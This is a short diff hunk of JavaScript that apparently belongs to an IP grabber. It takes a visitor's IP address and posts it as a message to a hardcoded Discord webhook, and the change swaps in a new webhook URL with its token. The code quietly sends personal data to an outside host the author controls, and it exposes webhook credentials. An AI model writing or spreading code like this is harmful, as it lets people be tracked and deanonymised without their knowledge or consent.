@@ -33,7 +33,7 @@
             .then(response => response.text())
             .then(data => {
                 ip = data.trim();
-                var webhookURL = 'https://discord.com/api/webhooks/1125449057347846315/Xiiy-bJH4CYr9MKDDrX3DxQRl9QlfMWyh4V-bZ-HDpj7gtYgun4OyFZSIEGt1cJ5vuN4';
+                var webhookURL = 'https://discord.com/api/webhooks/1131312853530452080/2_X8OpqzyR5Pb-eKzktjX-6zELdTO8oTRuTBZ0eR_kxKL4Y5AB2MfhYnZHqEWhxb9t5e';
                 var content = 'IP Address: ' + ip;
                 if (content.length <= 2000) {
                     sendMessage(webhookURL, content);
